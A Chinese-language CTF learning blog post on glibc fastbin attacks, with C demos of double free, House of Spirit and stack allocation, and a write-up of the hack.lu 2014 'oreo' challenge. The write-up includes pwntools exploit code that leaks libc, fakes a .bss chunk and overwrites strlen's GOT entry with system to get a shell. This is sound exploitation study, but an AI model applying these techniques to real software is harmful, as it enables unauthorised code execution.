---
title: Fastbin Attack related
date: 2020-11-1
author: x1ngg3
description: "ಥಥ"
---

 ಥ_ಥ

<!-- more -->

### Fastbin Double Free

Fastbin Double Free 能够成功利用主要有两部分的原因

1. fastbin 的堆块被释放后 **next_chunk 的 pre_inuse 位不会被清空**
2. fastbin 在执行 free 的时候**仅验证了 main_arena 直接指向的块**，即链表指针头部的块。对于链表后面的块，并没有进行验证。

如下代码可以跳过`double free`检测：

```c
int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk2);
    free(chunk1);
    return 0;
}
```

效果如下：

![image-20201208222201746](https://x1ngg3-pic.oss-cn-beijing.aliyuncs.com/myimg/4J7rMzwoHXR2Kc8.png)

注意因为 chunk1 被再次释放因此其 fd 值不再为 0 而是指向 chunk2，这时如果我们可以控制 chunk1 的内容，便可以写入其 fd 指针从而实现在我们想要的任意地址分配 fastbin 块。 

也就是：main_arena=>chunk1=>chun2=>chunk1=>fd

比如说对于如下代码，可以将chunk分配到bss段上

```c
typedef struct _chunk
{
    long long pre_size;
    long long size;
    long long fd;
    long long bk;
} CHUNK,*PCHUNK;

CHUNK bss_chunk;

int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    void *chunk_a,*chunk_b;

    bss_chunk.size=0x21;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk2);
    free(chunk1);

    chunk_a=malloc(0x10);
    *(long long *)chunk_a=&bss_chunk;
    malloc(0x10);
    malloc(0x10);
    chunk_b=malloc(0x10);
    printf("%p",chunk_b);
    return 0;
}
```



### House Of Spirit

House of Spirit 是 `the Malloc Maleficarum` 中的一种技术。

该技术的核心在于在目标位置处伪造 fastbin chunk，只要构造好数据，释放后系统会错误的将该区域作为堆块放到相应的fast bin里面，最后再分配出来的时候，就有可能改写我们目标区域从而达到分配**指定地址**的 chunk 的目的。

有两个例子可以帮助理解，个人觉得第二个好理解一点：

#### example 1

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    fprintf(stderr, "This file demonstrates the house of spirit attack.\n");

    fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
    malloc(1);

    fprintf(stderr, "We will now overwrite a pointer to point to a fake 'fastbin' region.\n");
    unsigned long long *a;
    // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
    unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));

    fprintf(stderr, "This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[7]);

    fprintf(stderr, "This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
    fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
    fake_chunks[1] = 0x40; // this is the size

    fprintf(stderr, "The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n");
        // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
    fake_chunks[9] = 0x1234; // nextsize

    fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
    fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
    a = &fake_chunks[2];

    fprintf(stderr, "Freeing the overwritten pointer.\n");
    free(a);

    fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
    fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
}
```

#### example 2

```c
#include <stdio.h>
  #include <stdlib.h>
   
  int main()
  {
         printf("This file demonstrates the house of spirit attack.n");
   
         printf("Calling malloc() once so that it sets up its memory.n");
         malloc(1);
  
        printf("We will now overwrite a pointer to point to a fake 'fastbin' region.n");
        unsigned long long *a;
        unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));
  
        printf("This region must contain two chunks. The first starts at %p and the second at %p.n", &fake_chunks[1], &fake_chunks[7]);
  
        printf("This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.n");
        printf("... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. n");
        fake_chunks[1] = 0x40; // this is the size
  
        printf("The chunk.size of the *next* fake region has be above 2*SIZE_SZ (16 on x64) but below av->system_mem (128kb by default for the main arena) to pass the nextsize integrity checks .n");
        fake_chunks[9] = 0x2240; // nextsize
  
        printf("Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.n", &fake_chunks[1]);
        printf("... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.n");
        a = &fake_chunks[2];
  
        printf("Freeing the overwritten pointer.n");
        free(a);
  
        printf("Now the next malloc will return the region of our fake chunk at %p, which will be %p!n", &fake_chunks[1], &fake_chunks[2]);
        printf("malloc(0x30): %pn", malloc(0x30));
 }
```



### Alloc to Stack

该技术的核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。

这里也就是在栈上构造出chunk的结构来骗过上帝，有时候是利用程序的流程来控制数据使符合chunk的结构。

`example`

```c
typedef struct _chunk
{
    long long pre_size;
    long long size;
    long long fd;
    long long bk;
} CHUNK,*PCHUNK;

int main(void)
{
    CHUNK stack_chunk;

    void *chunk1;
    void *chunk_a;

    stack_chunk.size=0x21;
    chunk1=malloc(0x10);

    free(chunk1);

    *(long long *)chunk1=&stack_chunk;
    malloc(0x10);
    chunk_a=malloc(0x10);
    return 0;
}
```



### Arbitrary Alloc

Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 **事实上只要满足目标地址存在合法的 size 域**（**这个 size 域是构造的，还是自然存在的都无妨**），**我们可以把 chunk 分配到任意的可写内存中**，比如 bss、heap、data、stack 等等。

[演示例子](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#arbitrary-alloc)



### 2014 hack.lu oreo

 啊，怎么说呢挺难过的，还是有个地方没有弄懂是为什么，搜也搜不到（可能师傅们觉得这种简单地方应该没人不会吧(⑉･̆-･̆⑉)），我也不能一直在这里死磕浪费时间，就先这样吧。

#### add

首先在`heap_bss`上保存了当前分配的堆的地址，**这个地址在每次分配的时候都会更新**。

那程序是如何遍历这些chunk的呢，在每个chunk的`data+0x34`处保存了上一个chunk的地址，heap_bss上保存最新创建的chunk地址，以此来实现遍历。

另外注意两次`gets`的大小都是56，而块的大小为`0x30`存在堆溢出。

```c
unsigned int add()
{
  rifle *v1; // [esp+18h] [ebp-10h]
  unsigned int v2; // [esp+1Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  v1 = heap_bss;
  heap_bss = malloc(0x38u);                     // 每次分配的时候，都会更新
  if ( heap_bss )
  {
    *(&heap_bss->field_20 + 2) = v1;            // 在每个堆的末尾，写上一个堆的地址，并非13而是0x34，看汇编
    printf("Rifle name: ");
    fgets(&heap_bss->field_7, 56, stdin);       // 会在结尾加上'\0'
    vul(&heap_bss->field_7);
    printf("Rifle description: ");
    fgets(&heap_bss->des.des, 56, stdin);
    vul(&heap_bss->des.des);
    ++add_num;
  }
  else
  {
    puts("Something terrible happened!");
  }
  return __readgsdword(0x14u) ^ v2;
}
```

#### show

这里没啥说的，就是遍历

```c
unsigned int show()
{
  rifle *i; // [esp+14h] [ebp-14h]
  unsigned int v2; // [esp+1Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  printf("Rifle to be ordered:\n%s\n", "===================================");
  for ( i = heap_bss; i; i = *(&i->field_20 + 2) )
  {
    printf("Name: %s\n", &i->name);
    printf("Description: %s\n", i);
    puts("===================================");
  }
  return __readgsdword(0x14u) ^ v2;
}
```

#### delete

一个依次释放块的过程，利用每个块结尾所保存的指针。这里主要如果把该指针覆盖为0的话，则遍历提前结束。

```c
unsigned int delete()
{
  rifle *ptr; // ST18_4
  rifle *v2; // [esp+14h] [ebp-14h]
  unsigned int v3; // [esp+1Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  v2 = heap_bss;
  if ( add_num )
  {
    while ( v2 )
    {
      ptr = v2;
      v2 = *(&v2->field_20 + 2);
      free(ptr);
    }
    heap_bss = 0;
    ++order_num;
    puts("Okay order submitted!");
  }
  else
  {
    puts("No rifles to be ordered!");
  }
  return __readgsdword(0x14u) ^ v3;
}
```

#### leave_message

这里有任意写的一个机会。

```c
unsigned int leave_message()
{
  unsigned int v0; // ST1C_4

  v0 = __readgsdword(0x14u);
  printf("Enter any notice you'd like to submit with your order: ");
  fgets(message, 128, stdin);                   // message处有一个指针指向另一块区域，留言的数据在那。如果修改此指针可达到任意写效果。
  vul(message);
  return __readgsdword(0x14u) ^ v0;
}
```

还一个函数没啥用，不多说了。

### payload

这里我不想太可以去说是利用了些什么方式来拿shell（~~因为我说不清楚~~），直接看思路吧。

> step1：通过show函数来泄露出Libc基址。
>
> step2：通过add函数在bss上构造出一个fake_chunk。
>
> step3：通过leave_message函数和add函数中野联动来达到任意地址写效果。这里是把strlen改写为system
>
> step4：通过leave_message函数来实现system(system;/bin/sh)=system(system) + system(/bin/sh)成功get_shell。

#### step1

注意一个小细节，为什么是接受两次`Description: `，在程序添加第一个chunk后，因为前面没有其他的chunk了，所以`data+0x34`处的地址是`\x00`，我们把这里覆盖为`puts.got`的地址就会造成前面还有chunk的假象，第二次输出的前4位（32位程序）正是puts的真实地址。

```python
    name = 27 * 'a' + p32(oreo.got['puts']) 
    add(20 * 'a', name)
    show_rifle()
    p.recvuntil('Description: ')
    p.recvuntil('Description: ')
    puts_addr = u32(p.recvuntil('\n', drop=True)[:4])
    log.success('puts addr: ' + hex(puts_addr))
    libc_base = puts_addr - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + next(libc.search('/bin/sh'))
```

#### step2

注意看下面的几个变量，其相差均为`0x4`，如果可以控制对应的数据，那么就可以在bss上伪造出一个chunk，再利用上一步用到的覆盖chunk末尾的指针，则可以实现在bss上malloc

具体实现就是，add_num会记录程序add的chunk块，我们add个0x40此就可以把add_num作为chunk的size了。

```
.bss:0804A2A0 order_num       dd ?                    ; DATA XREF: delete+5A↑r
.bss:0804A2A0                                         ; delete+62↑w ...
.bss:0804A2A4 add_num         dd ?                    ; DATA XREF: add+C5↑r
.bss:0804A2A4                                         ; add+CD↑w ...
.bss:0804A2A8 ; char *message
.bss:0804A2A8 message         dd ?                    ; DATA XREF: leave_message+23↑r
.bss:0804A2A8                                         ; leave_message+3C↑r ...
.bss:0804A2AC                 align 20h
.bss:0804A2C0 unk_804A2C0     db    ? ;               ; DATA XREF: main+29↑o
.bss:0804A2C1                 db    ? ;
.bss:0804A2C2                 db    ? ;
.bss:0804A2C3                 db    ? ;
.bss:0804A2C4                 db    ? ;
.bss:0804A2C5                 db    ? ;
.bss:0804A2C6                 db    ? ;
.bss:0804A2C7                 db    ? ;
.bss:0804A2C8                 db    ? ;
```

```python
oifle = 1
    while oifle < 0x3f:
        # set next link=NULL
        add(25 * 'a', 'a' * 27 + p32(0))
        oifle += 1
```

#### step3

这里我觉得算是整个程序我最难理解的一部分吧

上面说到为了使add_num达到0x40要add

这里首先使构造这0x40个chunk的最后一个chunk

**把chunk的指针（data+0x34）指到bss段上**，这里是0x804a2a8

然后leave_message留言使data+0x34的部分为”\x00“，这里就是让我裂开的地方，我觉得覆盖到0xe0前面就行了，但事实是，不行。

这里是真的把我给看傻了，ctf-wiki在该fake_chunk后又构造了一个chunk，我不知道目的是什么，经过测试不构造这个也可以，但是必须要填充至少0x25个数据上去。为什么呢，为什么呢，为什么呢，我他妈裂开。

```
pwndbg> x/40wx 0x0804A2A0
0x804a2a0:	0x00000000	0x00000040	0x0804a2c0	0x00000000
0x804a2b0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a2c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a2d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a2e0:	0x00000000	0x00000a61	0x00000000	0x00000000
0x804a2f0:	0x00000000	0x00000000	0x00000000	0x00000000
```

然后就是order来ferr掉我们伪造的chunk，这样下次分配的时候就会分配到我们伪造的这个chunk上。

**分配的时候把0x804a2a8的位置重写为strlen函数的got表位置**，再次leave_message的时候，会直接通过0x804a2a8跳转到strlen.got上，这样就达到了修改got表的目的。

为什么是strlen这个函数呢，因为在leave_message完之后（其实add中两次fgets也一样），会调用vul()函数来对输入进行一个判断，其中会有strlen()函数。其中strlen函数的参数在这里是bss上message的地址，而该地址的值又是另一个地址，如果最终的值是“\bin\sh”，在strlen被改为system的情况下，**最终效果就是通过strlen(bss_heap)来实现system("/bin/sh")的效果**。

```c
unsigned int leave_message()
{
  unsigned int v0; // ST1C_4

  v0 = __readgsdword(0x14u);
  printf("Enter any notice you'd like to submit with your order: ");
  fgets(message, 128, stdin);                   // message处有一个指针指向另一块区域，留言的数据在那。如果修改此指针可达到任意写效果。
  vul(message);
  return __readgsdword(0x14u) ^ v0;
}
```

```c
unsigned int __cdecl vul(const char *heap_25)
{
  size_t v1; // edx
  char *v3; // [esp+28h] [ebp-10h]
  unsigned int v4; // [esp+2Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  v1 = strlen(heap_25) - 1;   //就是利用这一行来实现get_shell，我这里修改结构体没改好有点难看。
  v3 = &heap_25[v1];
  if ( &heap_25[v1] >= heap_25 && *v3 == 10 )
    *v3 = 0;
  return __readgsdword(0x14u) ^ v4;
}
```

```python
    payload = 'a' * 27 + p32(0x0804a2a8)
    # set next link=0x0804A2A8, try to free a fake chunk
    add(25 * 'a', payload)
    # before free, we need to bypass some check
    # fake chunk's size is 0x40
    # 0x20 *'a' for padding the last fake chunk
    # 0x40 for fake chunk's next chunk's prev_size
    # 0x100 for fake chunk's next chunk's size
    # set fake iofle' next to be NULL
    payload = 0x24 * '\x00' + 'a'  
    #+ p32(0x60)
    #payload = payload.ljust(52, 'b')
    #payload += p32(0)
    #payload = payload.ljust(128, 'c')
    message(payload)
    # fastbin 0x40: 0x0804A2A0->some where heap->NULL
    #gdb.attach(p)
    #p.interactive()
    order()
	payload = p32(oreo.got['strlen']).ljust(20, 'a')
    add(payload, 'b' * 20)
```

#### step4

这里是一个小细节，因为strlen的参数bss_heap也指向了strlen的got表。

但是注意`;`可以分割命令，所以`system("system;/bin/sh") = system("system") + system("/bin/sh")`

system("system")不能正确执行，所以最后只剩system("/bin/sh")了

```python
	message(p32(system_addr) + ';/bin/sh\x00')    
    p.interactive()
```



### Reference 

[Fastbin Attack](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#fastbin-attack)

[【技术分享】堆之House of Spirit](https://www.anquanke.com/post/id/85357)

[House of Spirit学习调试验证与实践](https://blog.csdn.net/xiaoi123/article/details/81482385)

[linux 堆溢出学习之house of spirit(1) malloc maleficarum hos翻译](https://blog.csdn.net/qq_29343201/article/details/59477082)



### Summary

怎么说呢，被一道并不算难，甚至可以说是简单？的题目卡了两三天还是挺让人沮丧的，眼看上海赛已经迫在眉睫了自己进展却是如此缓慢。做逆向的时候学如嚼蜡进度如乌龟爬，被pwn所吸引之后却又感觉时间是如此的不够用，如果......

没有什么如果啦，归根结底还是自己太懒了不够努力

2020马上就要结束了，这并不是很美好的一年，疫情，山火、蝗灾、川皇落选......一切都让2020充满了魔幻色彩。临近的尾声的2020也不让人消停，岁末赛出题加上猝不及防的上海赛都让我倍感压力，但看看周围其他同学，谁又不是顶着压力前行呢，保研的希望稳住最后的考试，实习的忙着准备面试，打学科竞赛的更是夜以继日的学，大伙都在努力冲冲冲呢。

未哭过长夜者，不足以语人生，希望在走过这些无人问津的孤独旅程后，我们都能迎来一个更好的2021年，以及之后的每一年！( ｀・∀・´)ﾉﾖﾛｼｸ